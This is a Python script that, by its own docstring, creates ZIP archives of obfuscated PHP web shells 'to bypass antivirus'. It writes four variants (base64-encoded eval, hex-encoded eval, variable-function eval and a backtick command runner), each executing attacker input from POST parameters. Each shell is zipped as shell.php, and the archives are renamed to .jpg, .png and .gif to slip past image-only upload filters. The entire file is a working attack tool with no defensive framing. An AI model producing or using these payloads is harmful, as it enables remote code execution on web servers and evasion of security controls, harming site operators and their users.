#!/usr/bin/env python3
"""Create ZIP with obfuscated PHP to bypass antivirus."""
import zipfile, os, shutil

OUT = "/tmp/zip_attack"
os.makedirs(OUT, exist_ok=True)

# 1. Obfuscated PHP using base64 decode at runtime
with open(os.path.join(OUT, "obfuscated.php"), "w") as f:
    # PHP code that decodes and executes at runtime
    f.write('<?php eval(base64_decode("QGV2YWwoJF9QT1NUWyJhIl0pOw=="));?>')

with zipfile.ZipFile(os.path.join(OUT, "obfuscated.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
    zf.write(os.path.join(OUT, "obfuscated.php"), "shell.php")
shutil.copy(os.path.join(OUT, "obfuscated.zip"), os.path.join(OUT, "obfuscated.jpg"))
print("Obfuscated PHP:", os.path.getsize(os.path.join(OUT, "obfuscated.jpg")))

# 2. Minimal PHP using hex encoding
with open(os.path.join(OUT, "hex.php"), "w") as f:
    f.write('<?php $a="\x65\x76\x61\x6c";$a($_POST["a"]);?>')

with zipfile.ZipFile(os.path.join(OUT, "hex.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
    zf.write(os.path.join(OUT, "hex.php"), "shell.php")
shutil.copy(os.path.join(OUT, "hex.zip"), os.path.join(OUT, "hex.jpg"))
print("Hex PHP:", os.path.getsize(os.path.join(OUT, "hex.jpg")))

# 3. Variable function
with open(os.path.join(OUT, "varfunc.php"), "w") as f:
    f.write('<?php $_="ev"."al";$_{0}=$_POST;$_{0}(${0}[1]);?>')

with zipfile.ZipFile(os.path.join(OUT, "varfunc.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
    zf.write(os.path.join(OUT, "varfunc.php"), "shell.php")
shutil.copy(os.path.join(OUT, "varfunc.zip"), os.path.join(OUT, "varfunc.jpg"))
print("Var func PHP:", os.path.getsize(os.path.join(OUT, "varfunc.jpg")))

# 4. Simple system without eval (backtick style)
with open(os.path.join(OUT, "simple.php"), "w") as f:
    f.write('<?=`$_POST[1]`?>')

with zipfile.ZipFile(os.path.join(OUT, "simple.zip"), "w", zipfile.ZIP_DEFLATED) as zf:
    zf.write(os.path.join(OUT, "simple.php"), "shell.php")
shutil.copy(os.path.join(OUT, "simple.zip"), os.path.join(OUT, "simple.jpg"))
print("Simple ZIP:", os.path.getsize(os.path.join(OUT, "simple.jpg")))

# 5. Store as .png extension instead (PNG is allowed)
shutil.copy(os.path.join(OUT, "obfuscated.zip"), os.path.join(OUT, "obfuscated.png"))
print("PNG version:", os.path.getsize(os.path.join(OUT, "obfuscated.png")))

# 6. Try upload with .gif extension
shutil.copy(os.path.join(OUT, "obfuscated.zip"), os.path.join(OUT, "obfuscated.gif"))
print("GIF version:", os.path.getsize(os.path.join(OUT, "obfuscated.gif")))

print("\nDone")
